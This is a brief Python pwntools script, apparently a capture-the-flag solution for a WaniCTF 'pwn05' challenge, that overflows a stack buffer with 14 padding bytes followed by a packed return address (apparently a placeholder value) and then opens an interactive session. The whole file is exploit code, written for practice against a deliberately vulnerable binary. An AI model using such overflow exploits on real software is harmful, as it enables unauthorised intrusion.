import pwn

#io = pwn.remote("ret.wanictf.org", 9005)
io = pwn.process("./pwn05")

ret = io.readuntil("What's your name?: ")
print(ret)

addr = 0x0102030405
s = b"A" * 14
s += pwn.p64(addr)

print(s)

io.send(s)
io.interactive()


